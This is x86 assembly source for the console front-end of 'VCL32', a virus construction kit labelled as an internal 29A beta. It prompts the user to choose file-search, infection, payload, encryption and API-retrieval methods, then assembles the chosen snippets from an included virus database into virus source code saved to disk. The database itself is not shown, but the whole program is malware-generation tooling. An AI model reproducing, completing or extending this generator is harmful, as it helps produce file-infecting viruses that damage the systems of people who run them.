;VCL32 console GUI

;sample console gui. dont check user input, so use with care.

;USAGE: VCL32CONSOLE.EXE <ASM FILE>

.586p
.model flat
locals

include header.inc

.code

include virdb.inc

include cmdline.inc
include console.inc
include consts.inc


;input edi=buffer/return eax=size
generate_virus:
	sub eax,eax
	pushad

;set virus phase to 0

	mov dwo [counter],0
	sub esp, 128
  @@phase_loop:

;get the number(nad names) of snippets that exists for this phase
	push esp
	push dwo [counter]
	call get_level_entries

;no snippet? the skip

	test eax,eax
	jz @@skip_level

;one snippet? the no user choice

	dec eax
	jz @@single_choice

;show choice description

	mov edx,[counter]
	mov edx,[ofs table+edx*4]
	call dump_asciiz_edx

;show option texts...

	mov esi,esp
	lea ecx,[eax+1]
	sub edx,edx
  @@next_option:

;get snippet name

	lodsd

;get info about this snippet

	push eax
	call get_name_options

;print info about the snippet

	mov eax,edx
	call dump_dec
	call dump_space
	mov al,"-"
	call dump_al
	call dump_space
	push edx
	mov edx,[ebx.ptr2help]
	call dump_asciiz_edx
	pop edx
	call dump_crlf

;show user next option for this question

	inc edx
	loop @@next_option

;wait for user input

	mov edx,ofs choose_option
	call dump_asciiz_edx

	call readconsole

;get user input

	mov edx,[esp+eax*4]

;get info about the user option

	push edx
	call get_name_options

;check if snippet need params

	mov ecx,[ebx.params]
	mov ebp,ecx
	jecxz @@noparam

;reserve stack space, and setup extra params reading(and later fixup)

	shl ebp,2
	sub esp,128*4
	mov edx,esp
  @@pushl:

;read user input

	push edx
	mov edx,ofs enter_param
	call dump_asciiz_edx
	mov edx,[esp]
	call readkbd

;put user param in stack

	push edx
	add edx,128
	loop @@pushl

  @@noparam:

;copy snippet to output buffer

  	push dwo [ebx.name]
  	call copy_snippet

;that snippet used params?

  	test ebp,ebp
	jz @@nofreeparam

;if used, clean the messy stack

	lea esp,[esp+ebp+128*4]

  @@nofreeparam:
	jmp @@skip_level

  @@single_choice:

;copy snippet to output buffer

  	push dwo [esp]
  	call copy_snippet

;do virus next phase, till phase 10

  @@skip_level:
	inc dwo [counter]
	cmp dwo [counter],10
	jne @@phase_loop
	add esp, 128

;return size

	sub edi,[esp.Pushad_edi]
	mov [esp.Pushad_eax],edi
	popad
	ret


main:
	mov edx, ofs copyright
	call dump_asciiz_edx

;get filename of ASM to generate from cmdline

	call getcmdline
	mov edx, ofs usage
	cmp dwo [argc],2
	jne @@exit

;init .DAT engine shits

	call init_mem

	push 256*1024
	call malloc
	mov esi,eax
	mov edi,eax

	call load_db
	call init_db

;generate virus source!

	call generate_virus

;copy generated ASM to buffer

	mov edi,eax
	push edi
	push eax
	push 40h
	callW GlobalAlloc
	push eax
	mov ecx,edi
	mov edi,eax
	rep movsb
	pop esi
	pop edi

;cleanup engine

	call cleanup_db

	call done_mem

;save generated ASM to file

	push 0
	push 80h
	push 2
	push 0
	push 0
	push 0c0000000h
	push ofs argv1
	callW CreateFileA
	mov ebx,eax
	inc eax
	jz @@exit_error

	push 0
	mov eax,esp
	push 0
	push eax
	push edi
	push esi
	push ebx
	callW WriteFile

	push esi
	callW GlobalFree

	mov [esp],ebx
	callW CloseHandle

	mov edx, ofs done
	jmp @@exit

  @@exit_error:
	mov edx, ofs error
	jmp @@exit

  @@exit:
	call dump_asciiz_edx
	push 0
	callW ExitProcess


;get digit from user

readconsole:
	push -10             ; STD_INPUT_HANDLE
	callW GetStdHandle

	push 0
	mov ecx,esp
	push 0
	mov edx,esp

	push 0
	push edx
	push 4
	push ecx
	push eax
	callW ReadConsoleA

	pop eax
	pop eax
	sub al,"0"
	movzx eax,al
	ret


;get string from user

readkbd:
	pushad
	push -10             ; STD_INPUT_HANDLE
	callW GetStdHandle

	push 0
	mov edx,esp

	push 0
	push edx
	push 128
	mov esi,[esp.cPushad.Arg1.(Pshd*4)]
	push esi
	push eax
	callW ReadConsoleA

  @@loop:
	cmp by [esi]," "
	jne @@nospace
	mov by [esi],"|"
  @@nospace:
	cmp wo [esi],0a0dh
	je @@set0
	inc esi
	jmp @@loop
  @@set0:
	mov by [esi],0

	pop eax
	popad
	ret 4


;we dont free anything (who care anyway)

free:
;	pushad
;	push dwo [esp.cPushad.Arg1]
;	callW GlobalFree
;	popad
	ret 4


;memory alloc routine called by .dat engine

malloc:
	pushad

	mov eax,[mem_pool]
	mov [esp.Pushad_eax],eax
	add eax,[esp.cPushad.Arg1]
	mov [mem_pool],eax

	popad
	ret 4


;init mem buffers for our malloc() routine

init_mem:
	pushad
	push 1024*1024
	push 40h
	callW GlobalAlloc
	mov [mem_pool],eax
	mov [mem_base],eax
	popad
	ret


;free allocated mem (for out malloc())

done_mem:
	pushad
	push dwo [mem_base]
	callW GlobalFree
	popad
	ret


.data

copyright db "VCL32 *BETA*",13,10
	db "INTERNAL 29A VERSION - DO NOT DISTRIBUTE",13,10,13,10,0
usage	db "USAGE: VCL32CONSOLE.EXE <ASM FILE>",13,10,0
error	db "Error!!",7,13,10,0
done 	db "Done!",13,10,0

choose_option 	db "Whats your option? ",0
enter_param 	db "Enter parameter: ",0

include cmdline2.inc

mem_base dd ?
mem_pool dd ?
counter	 dd ?

table	dd ofs level0
	dd ofs level1
	dd ofs level2
	dd ofs level3
	dd ofs level4
	dd ofs level5
	dd ofs level6
	dd ofs level7
	dd ofs level8
	dd ofs level9

level0	db "init",13,10,0
level1	db "main",13,10,0
level2	db "How do you want the virus search for files?",13,10,0
level3	db "mapinf",13,10,0
level4	db "How do you want the virus infect target files",13,10,0
level5	db "What is the virus payload?",13,10,0
level6	db "What encryption the virus should use?",13,10,0
level7	db "What method virus should use to retrieve APIs?",13,10,0
level8	db "getapi",13,10,0
level9	db "coda",13,10,0

end	main
